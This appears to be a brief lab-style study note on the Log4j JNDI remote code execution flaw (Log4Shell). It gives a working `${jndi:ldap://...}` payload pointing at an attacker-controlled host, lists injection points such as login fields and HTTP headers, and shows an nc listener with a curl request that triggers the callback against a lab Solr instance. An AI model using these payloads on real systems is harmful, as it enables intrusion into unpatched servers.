log4j packege in java has rce.

log4j is java logging package. it is used in apache,apple icloud,minecraft etc.

## How vuln work 

A single string of text can trigger an application to reach out to an external location if it is logged via the vulnerable instance of log4j. 

payload : 
`${jndi:ldap://ATTACKERCONTROLLEDHOST}`

This syntax indicates that the log4j will invoke functionality from `JNDI`.(Java Naming and Directory Interface) . ltimately, this can be used to access external resources, or "references," which is what is weaponized in this attack. 


**where could we enter this syntax?**

Anywhere that has data logged by the application.

- Input boxes, user and password login forms, data entry points within applications
- HTTP headers such as User-Agent, X-Forwarded-For, or other customizable headers
- any placed for user supplied data.


**How to verify**

listen on your computer: `nc -nvlp 1234`
send request : `curl 'http://target_ip:target_port/somepath/anotherpath/some_page?foo=$\{jndi:ldap://your_ip:your_port\}' `

eg :

`curl 'http://10.10.234.60:8983/solr/admin/cores?foo=$\{jndi:ldap://10.11.57.82:1234\}' `
